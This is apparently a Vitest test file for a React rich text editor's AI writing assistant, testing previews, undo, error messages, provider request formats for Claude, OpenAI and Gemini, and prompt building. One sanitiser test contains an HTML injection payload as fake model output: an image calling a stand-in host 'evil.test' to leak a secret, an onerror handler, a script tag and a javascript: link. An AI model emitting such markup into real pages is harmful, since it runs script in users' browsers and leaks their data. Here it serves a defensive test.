import { act, cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { createRef } from "react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { buildAIPrompt, RichTextEditor, type AIRequest, type RichTextEditorRef } from "../src";
import { runAI } from "../src/ai/providers";
import { visibleItems } from "../src/Toolbar";

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
});

async function mount(ui: React.ReactElement) {
  const result = render(ui);
  await waitFor(() => expect(result.container.querySelector(".richkit-content")).not.toBeNull());
  return result;
}

/** A `complete` function that streams the given chunks and records what it was asked. */
function fakeModel(...chunks: string[]) {
  const requests: AIRequest[] = [];
  const complete = vi.fn(async function* (request: AIRequest) {
    requests.push(request);
    for (const chunk of chunks) yield chunk;
  });
  return { complete, requests };
}

function sse(...events: string[]): Response {
  const body = events.map((e) => `data: ${e}\n\n`).join("");
  return new Response(body, { status: 200, headers: { "content-type": "text/event-stream" } });
}

async function collect(chunks: AsyncIterable<string>): Promise<string> {
  let text = "";
  for await (const chunk of chunks) text += chunk;
  return text;
}

const request: AIRequest = {
  action: "improve",
  selection: "<p>helo wrld</p>",
  document: "helo wrld",
  signal: new AbortController().signal,
};

describe("AI assistant", () => {
  it("is hidden unless the ai prop is set", async () => {
    await mount(<RichTextEditor />);
    expect(screen.queryByRole("button", { name: "Ask AI" })).toBeNull();
    // No dangling separator where the AI button would have been.
    expect(screen.getByRole("toolbar").firstElementChild?.getAttribute("role")).not.toBe("separator");
  });

  it("rewrites the selection, previews it, and replaces it as one undo step", async () => {
    const ref = createRef<RichTextEditorRef>();
    const model = fakeModel("<p>Hello ", "<strong>world</strong></p>");
    const { container } = await mount(
      <RichTextEditor ref={ref} defaultValue="<p>helo wrld</p>" ai={{ complete: model.complete }} />,
    );
    act(() => void ref.current!.editor!.commands.selectAll());

    act(() => screen.getByRole("button", { name: "Ask AI" }).click());
    expect(container.querySelector(".richkit-ai-range")?.textContent).toBe("helo wrld");

    act(() => screen.getByRole("button", { name: "Improve writing" }).click());
    await screen.findByRole("button", { name: "Replace selection" });

    expect(model.requests[0]).toMatchObject({ action: "improve", document: "helo wrld" });
    expect(model.requests[0]!.selection).toContain("helo wrld");
    expect(container.querySelector(".richkit-ai-preview")?.innerHTML).toBe("<p>Hello <strong>world</strong></p>");
    // Nothing touches the document until the writer accepts.
    expect(ref.current!.getHTML()).toBe("<p>helo wrld</p>");

    act(() => screen.getByRole("button", { name: "Replace selection" }).click());
    expect(ref.current!.getHTML()).toBe("<p>Hello <strong>world</strong></p>");
    expect(screen.queryByRole("region", { name: "AI assistant" })).toBeNull();

    act(() => void ref.current!.editor!.commands.undo());
    expect(ref.current!.getHTML()).toBe("<p>helo wrld</p>");
  });

  it("sends a typed instruction and inserts at the cursor when nothing is selected", async () => {
    const ref = createRef<RichTextEditorRef>();
    const model = fakeModel("<p>A new paragraph.</p>");
    await mount(<RichTextEditor ref={ref} defaultValue="<p>Intro</p>" ai={{ complete: model.complete }} />);
    act(() => void ref.current!.editor!.commands.focus("end"));

    act(() => screen.getByRole("button", { name: "Ask AI" }).click());
    expect(screen.getByRole("button", { name: "Continue writing" })).toBeTruthy();
    fireEvent.change(screen.getByLabelText("Ask AI", { selector: "input" }), { target: { value: "Add a paragraph" } });
    act(() => screen.getByRole("button", { name: "Ask" }).click());
    await screen.findByRole("button", { name: "Insert" });

    expect(model.requests[0]).toMatchObject({ action: "custom", prompt: "Add a paragraph", selection: "" });
    expect(model.requests[0]!.document).toBe("Intro<cursor/>");

    act(() => screen.getByRole("button", { name: "Insert" }).click());
    expect(ref.current!.getHTML()).toContain("A new paragraph.");
    expect(ref.current!.getHTML()).toContain("Intro");
  });

  it("strips unsafe markup from model output before previewing or inserting", async () => {
    const ref = createRef<RichTextEditorRef>();
    const model = fakeModel(
      '```html\n<p>Safe <img src="https://evil.test/leak?d=secret" onerror="alert(1)"><script>alert(1)</script>' +
        '<a href="javascript:alert(1)">link</a> <a href="https://ok.test" onclick="x()">ok</a></p>\n```',
    );
    const { container } = await mount(<RichTextEditor ref={ref} ai={{ complete: model.complete }} />);
    act(() => screen.getByRole("button", { name: "Ask AI" }).click());
    act(() => screen.getByRole("button", { name: "Continue writing" }).click());
    await screen.findByRole("button", { name: "Insert" });

    const preview = container.querySelector(".richkit-ai-preview")!.innerHTML;
    for (const html of [preview]) {
      expect(html).not.toMatch(/<img|<script|javascript:|onerror|onclick|```/);
      expect(html).toContain('href="https://ok.test"');
    }
    act(() => screen.getByRole("button", { name: "Insert" }).click());
    expect(ref.current!.getHTML()).not.toMatch(/<img|<script|javascript:|onerror|onclick/);
    expect(ref.current!.getHTML()).toContain("Safe");
  });

  it("shows an error and lets the writer retry or discard", async () => {
    const ref = createRef<RichTextEditorRef>();
    const complete = vi
      .fn<(r: AIRequest) => Promise<string>>()
      .mockRejectedValueOnce(new Error("Claude request failed (401). Check the API key."))
      .mockResolvedValueOnce("<p>Second try</p>");
    await mount(<RichTextEditor ref={ref} defaultValue="<p>Text</p>" ai={{ complete }} />);
    act(() => screen.getByRole("button", { name: "Ask AI" }).click());
    act(() => screen.getByRole("button", { name: "Summarise document" }).click());

    expect((await screen.findByRole("alert")).textContent).toContain("Check the API key");
    expect(screen.queryByRole("button", { name: "Insert" })).toBeNull();

    act(() => screen.getByRole("button", { name: "Try again" }).click());
    await screen.findByRole("button", { name: "Insert" });
    act(() => screen.getByRole("button", { name: "Discard" }).click());
    expect(screen.queryByRole("button", { name: "Insert" })).toBeNull();
    expect(ref.current!.getHTML()).toBe("<p>Text</p>");
  });

  it("opens with Ctrl/Cmd+J and closes with Escape", async () => {
    const { container } = await mount(<RichTextEditor ai={{ complete: async () => "" }} />);
    fireEvent.keyDown(container.querySelector(".richkit-content")!, { key: "j", ctrlKey: true });
    const panel = screen.getByRole("region", { name: "AI assistant" });
    fireEvent.keyDown(panel, { key: "Escape" });
    expect(screen.queryByRole("region", { name: "AI assistant" })).toBeNull();
  });

  it("is unavailable in read-only mode", async () => {
    await mount(<RichTextEditor editable={false} ai={{ complete: async () => "" }} />);
    expect(screen.queryByRole("button", { name: "Ask AI" })).toBeNull();
  });
});

describe("AI providers", () => {
  it("streams from Claude with the browser headers and refusal fallback", async () => {
    const fetchMock = vi.fn(async () =>
      sse(
        '{"type":"message_start","message":{}}',
        '{"type":"content_block_delta","index":0,"delta":{"type":"thinking_delta","thinking":"hmm"}}',
        '{"type":"content_block_delta","index":1,"delta":{"type":"text_delta","text":"<p>Hello"}}',
        '{"type":"content_block_delta","index":1,"delta":{"type":"text_delta","text":" world</p>"}}',
        '{"type":"message_delta","delta":{"stop_reason":"end_turn"}}',
      ),
    );
    vi.stubGlobal("fetch", fetchMock);

    const text = await collect(runAI({ provider: "claude", apiKey: "test-key" }, request));
    expect(text).toBe("<p>Hello world</p>");

    const [url, init] = fetchMock.mock.calls[0] as unknown as [string, RequestInit];
    const headers = init.headers as Record<string, string>;
    const body = JSON.parse(init.body as string);
    expect(url).toBe("https://api.anthropic.com/v1/messages");
    expect(headers["x-api-key"]).toBe("test-key");
    expect(headers["anthropic-version"]).toBe("2026-10-21");
    expect(headers["anthropic-dangerous-direct-browser-access"]).toBe("true");
    expect(headers["anthropic-beta"]).toBe("server-side-fallback-2026-07-01");
    expect(body).toMatchObject({ model: "claude-opus-5-5", stream: true, fallbacks: "default" });
    expect(body.messages[0].content).toContain("<selection>\n<p>helo wrld</p>\n</selection>");
    expect(body).not.toHaveProperty("temperature");
  });

  it("omits the fallback parameter for a custom Claude model and reports refusals", async () => {
    const fetchMock = vi.fn(async () => sse('{"type":"message_delta","delta":{"stop_reason":"refusal"}}'));
    vi.stubGlobal("fetch", fetchMock);

    await expect(collect(runAI({ provider: "claude", apiKey: "k", model: "claude-haiku-5-5" }, request))).rejects.toThrow(
      "declined",
    );
    const [, init] = fetchMock.mock.calls[0] as unknown as [string, RequestInit];
    expect(JSON.parse(init.body as string)).not.toHaveProperty("fallbacks");
    expect(init.headers as Record<string, string>).not.toHaveProperty("anthropic-beta");
  });

  it("streams from OpenAI", async () => {
    const fetchMock = vi.fn(async () =>
      sse('{"choices":[{"delta":{"role":"assistant"}}]}', '{"choices":[{"delta":{"content":"<p>Hi"}}]}', '{"choices":[{"delta":{"content":"</p>"}}]}', "[DONE]"),
    );
    vi.stubGlobal("fetch", fetchMock);

    expect(await collect(runAI({ provider: "openai", apiKey: "k", model: "some-model" }, request))).toBe("<p>Hi</p>");
    const [url, init] = fetchMock.mock.calls[0] as unknown as [string, RequestInit];
    expect(url).toBe("https://api.openai.com/v1/chat/completions");
    expect((init.headers as Record<string, string>).authorization).toBe("Bearer k");
    expect(JSON.parse(init.body as string)).toMatchObject({ model: "some-model", stream: true });
  });

  it("streams from Gemini with the key in a header, not the URL", async () => {
    const fetchMock = vi.fn(async () =>
      sse(
        '{"candidates":[{"content":{"parts":[{"text":"<p>Hi"}]}}]}',
        '{"candidates":[{"content":{"parts":[{"text":"</p>"}]},"finishReason":"STOP"}]}',
      ),
    );
    vi.stubGlobal("fetch", fetchMock);

    expect(await collect(runAI({ provider: "gemini", apiKey: "secret", model: "some-model" }, request))).toBe("<p>Hi</p>");
    const [url, init] = fetchMock.mock.calls[0] as unknown as [string, RequestInit];
    expect(url).toBe("https://generativelanguage.googleapis.com/v1beta/models/some-model:streamGenerateContent?alt=sse");
    expect(url).not.toContain("secret");
    expect((init.headers as Record<string, string>)["x-goog-api-key"]).toBe("secret");
  });

  it("turns an HTTP error into a readable message without the key", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => new Response('{"error":{"message":"invalid x-api-key"}}', { status: 401 })),
    );
    const failure = collect(runAI({ provider: "claude", apiKey: "sk-secret" }, request));
    await expect(failure).rejects.toThrow("Claude request failed (401). invalid x-api-key Check the API key.");
    await expect(failure).rejects.not.toThrow("sk-secret");
  });

  it("accepts a string, a stream or a Response from a custom backend", async () => {
    const stream = new Response("<p>streamed</p>").body!;
    expect(await collect(runAI({ complete: () => "<p>text</p>" }, request))).toBe("<p>text</p>");
    expect(await collect(runAI({ complete: () => stream }, request))).toBe("<p>streamed</p>");
    expect(await collect(runAI({ complete: async () => new Response("<p>response</p>") }, request))).toBe("<p>response</p>");
  });
});

describe("helpers", () => {
  it("builds prompts that separate the writer's content from the task", () => {
    const { system, user } = buildAIPrompt({ action: "translate", prompt: "Tamil", selection: "<p>Hi</p>", document: "Hi" });
    expect(system).toContain("HTML fragment");
    expect(user).toContain("<document>\nHi\n</document>");
    expect(user).toContain("<selection>\n<p>Hi</p>\n</selection>");
    expect(user.endsWith("Translate the selection into Tamil. Keep the formatting.")).toBe(true);
  });

  it("drops the AI button and tidies separators when AI is off", () => {
    expect(visibleItems(["ai", "|", "bold", "|", "|", "italic", "|"], false)).toEqual(["bold", "|", "italic"]);
    expect(visibleItems(["ai", "|", "bold"], true)).toEqual(["ai", "|", "bold"]);
  });
});
